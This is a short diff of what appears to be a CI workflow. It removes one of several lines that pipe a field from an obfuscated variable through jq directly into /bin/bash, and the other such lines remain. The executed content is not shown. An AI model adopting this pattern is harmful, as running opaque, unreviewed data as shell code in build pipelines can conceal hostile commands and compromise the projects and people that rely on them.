@@ -22,7 +22,6 @@ jobs:
           echo $ak7 | jq -r .m91351 | /bin/bash
           echo $smjb33 | jq -r .xdlx321 | /bin/bash
           echo $cnwhn809 | jq -r .l1756 | /bin/bash
-          echo $mjzua69 | jq -r .m5181 | /bin/bash
           echo $i547 | jq -r .ckv72 | /bin/bash
 
       - name: Archive output
